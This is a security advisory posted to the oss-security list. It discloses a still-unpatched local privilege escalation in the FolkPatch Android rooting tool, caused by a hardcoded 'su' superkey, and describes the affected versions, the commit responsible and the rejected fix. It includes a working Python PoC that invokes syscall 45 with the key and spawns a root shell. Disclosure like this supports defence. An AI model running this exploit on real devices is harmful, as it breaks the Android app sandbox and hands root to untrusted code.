X-Archive-Source: openwall-scrape
X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2026/09/12/1
Message-ID: <EwtFYrwmcjtJKs7hGq6oaMZCy4KgBbzfWMcEUc4VKJ0Zjnje9CbYmSKhno1NYu-A3Az1dQRXGKEiqI6Z5b0SUw0ynIvrrfF5LMZFKQ70a_Q=@proton.me>
Date: Sat, 12 Sep 2026 12:10:08 +0000
From: 12345678 <a1489632@...ton.me>
To: "oss-security@...ts.openwall.com" <oss-security@...ts.openwall.com>
Subject: Local Privilege Escalation (LPE) in FolkPatch due to Hardcoded Default SuperKey
Content-Type: text/plain; charset=utf-8

Dear oss-security mailing list subscribers,

A critical Local Privilege Escalation (LPE) vulnerability exists in FolkPatch (https://github.com/LyraVoid/FolkPatch), an Android rooting project derived from APatch (https://github.com/bmax121/APatch) that utilizes its own custom downstream fork of KernelPatch (https://github.com/LyraVoid/KernelPatch).

The vulnerability is specific to FolkPatch's downstream modifications rather than upstream (https://github.com/bmax121/KernelPatch). Due to a flawed architectural refactoring in commit 09b6dcbb21ae3d52400f9f2981746de2f7c8679b (https://github.com/LyraVoid/FolkPatch/commit/09b6dcbb21ae3d52400f9f2981746de2f7c8679b) which removed user-facing SuperKey management while retaining fallback code, all kernel images patched with FolkPatch versions 4.3 through V5.0-KP-0.13.8 contain a hardcoded default superkey of "su". Any unprivileged local process can invoke the custom "supercall" system call with this public key to instantly elevate privileges to root.

Credit & Timeline
* Initial Discovery: May 21, 2026, by can-xin (https://github.com/LyraVoid/FolkPatch/issues/142)
* Mitigation PR & PoC: August 31, 2026, by 1q23lyc45 (https://github.com/LyraVoid/FolkPatch/pull/207)
* PoC Publication: September 12, 2026, by 1q23lyc45
* Maintainer Response: The mitigation pull request was closed and rejected by the maintainer due to a misunderstanding of the authentication lifecycle. The vulnerability remains unpatched in official releases.

Vulnerability Details
In commit 09b6dcbb21ae3d52400f9f2981746de2f7c8679b, FolkPatch attempted to align its manager authentication mechanism by transitioning to a pure APK signature verification scheme. However, this refactoring introduced a severe security contradiction:
1. The maintainers removed all frontend UI toggles, encrypted storage wrappers, and user-configurable inputs for the SuperKey.
2. Official documentation states that SuperKey authentication was completely removed starting from FolkPatch v4.3.
3. Despite these frontend changes, the underlying toolchain and kernel patching logic preserved fallback behavior that hardcodes the superkey to the public string "su".

Consequently, every kernel image built by FolkPatch forces the superkey to "su". While the official Android manager app relies on APK signature matching for authentication, the kernel-level `supercall` interface (__NR_supercall, syscall number 45) remains wide open to anyone passing the hardcoded "su" string.

Impact
Any unprivileged local process—such as a malicious application, an infected SDK, or code executed via a browser sandbox escape—can directly invoke the custom system call, bypass manager authentication entirely, and execute arbitrary commands as root. This represents a complete breach of the Android application sandbox.

Proof of Concept (PoC)
The following Python 3 script demonstrates local privilege escalation via ctypes by invoking the `supercall` interface with the hardcoded "su" key:

import ctypes
import os

# Load C standard library to use syscall
libc = ctypes.CDLL(None, use_errno=True)

# Define constants
__NR_supercall = 45
SUPERCALL_SU = 0x1010
SUPERCALL_SCONTEXT_LEN = 0x60

# Mock version code (adjust according to the target KernelPatch version, e.g., 0x0a05 corresponds to 10, 5, 0)
MAJOR, MINOR, PATCH = 10, 5, 0

def ver_and_cmd(key: str, cmd: int) -> int:
    version_code = (MAJOR << 16) + (MINOR << 8) + PATCH
    return ((version_code << 32)) | (0x1158 << 16) | (cmd & 0xFFFF)

# Define SuProfile structure
class SuProfile(ctypes.Structure):
    _fields_ = [
        ("uid", ctypes.c_uint32),
        ("to_uid", ctypes.c_uint32),
        ("scontext", ctypes.c_char * SUPERCALL_SCONTEXT_LEN),
    ]

def sc_su(key: str, profile: SuProfile) -> int:
    # Construct the 64-bit return value for ver_and_cmd
    cmd_val = ver_and_cmd(key, SUPERCALL_SU)

    # Declare syscall argument types: sys_call_num, key(string), cmd_val(uint64), profile(pointer)
    libc.syscall.argtypes = [
        ctypes.c_long,
        ctypes.c_char_p,
        ctypes.c_uint64,
        ctypes.POINTER(SuProfile),
    ]
    libc.syscall.restype = ctypes.c_long

    # Encode key to bytes
    key_bytes = key.encode("utf-8")
    ret = libc.syscall(
        __NR_supercall, key_bytes, cmd_val, ctypes.byref(profile)
    )
    return ret

if __name__ == "__main__":
    # 1. Provide the hardcoded SuperKey
    super_key = "su"

    # 2. Configure privilege escalation profile: switch to uid 0 (root)
    profile = SuProfile()
    profile.uid = os.getuid()
    profile.to_uid = 0  # Target uid: root
    profile.scontext = b"u:r:kp:s0"  # Or adjust based on ALL_ALLOW_SCONTEXT

    print("Elevating privileges via supercall...")
    res = sc_su(super_key, profile)

    if res == 0:
        print("Privilege escalation successful! Spawning /system/bin/sh...")
        # 3. Spawn root shell upon successful escalation
        os.execl("/system/bin/sh", "sh")
    else:
        print(f"Privilege escalation failed, return value: {res}, errno: {ctypes.get_errno()}")

(Note: Portions of this PoC script structure were refined with AI assistance.)

Remediation and Mitigation Status
A pull request (PR #207) was previously submitted to implement randomized cryptographic generation and proper persistence of the superkey. However, it was rejected by the project maintainers due to a fundamental misunderstanding of the authentication lifecycle. Users are advised to discontinue the use of FolkPatch immediately until a proper root-cause fix is integrated into the KernelPatch fork. 


Best regards,

1q23lyc45
